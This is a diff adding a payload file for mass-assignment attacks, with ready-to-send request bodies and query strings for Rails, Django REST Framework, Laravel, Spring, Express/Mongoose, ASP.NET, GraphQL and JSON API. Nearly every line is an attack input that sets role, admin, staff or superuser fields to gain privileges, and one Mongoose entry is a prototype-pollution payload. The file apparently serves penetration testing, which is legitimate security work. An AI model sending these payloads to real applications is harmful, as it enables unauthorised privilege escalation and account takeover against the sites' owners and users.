@@ -1,0 +1,62 @@
+# ============================================================
+# Mass Assignment — Framework-Specific Payloads
+# ============================================================
+
+# ---- Ruby on Rails ----
+# Strong parameters bypass (before Rails 4)
+user[role]=admin
+user[admin]=true
+user[is_admin]=1
+user[account_type]=admin
+# attr_accessible bypass:
+user[admin]=1&user[email]=test@test.com
+
+# ---- Django REST Framework ----
+# ModelSerializer exposes all fields by default
+# Try adding: read_only fields in PUT/POST
+{"username":"test","is_staff":true,"is_superuser":true,"groups":["admin"]}
+{"email":"test@test.com","is_active":true,"is_staff":true}
+
+# ---- Laravel / Eloquent ----
+# If $guarded=[] or $fillable=['*']
+{"role":"admin","is_admin":1,"password_reset_token":"arbitrary"}
+# Mass assignment via relationship:
+{"user":{"role":"admin"}}
+
+# ---- Spring / Java ----
+# @ModelAttribute without @InitBinder restrictions
+role=ADMIN&authorities=ROLE_ADMIN&enabled=true&accountNonLocked=true
+
+# ---- Express.js / Mongoose ----
+# If schema not strictly defined
+{"__v":0,"role":"admin","permissions":["read","write","delete","admin"]}
+{"constructor":{"prototype":{"isAdmin":true}}}
+
+# ---- ASP.NET MVC ----
+# Model binding without [Bind] restrictions
+role=Admin&isAdmin=true&lockoutEnabled=false
+
+# ---- GraphQL Mass Assignment ----
+mutation {
+  updateUser(input: {
+    id: "1",
+    role: "ADMIN",
+    isAdmin: true,
+    permissions: ["ALL"]
+  }) {
+    id role
+  }
+}
+
+# ---- JSON API Mass Assignment ----
+{
+  "data": {
+    "type": "users",
+    "id": "1",
+    "attributes": {
+      "role": "admin",
+      "is_admin": true,
+      "plan": "enterprise"
+    }
+  }
+}
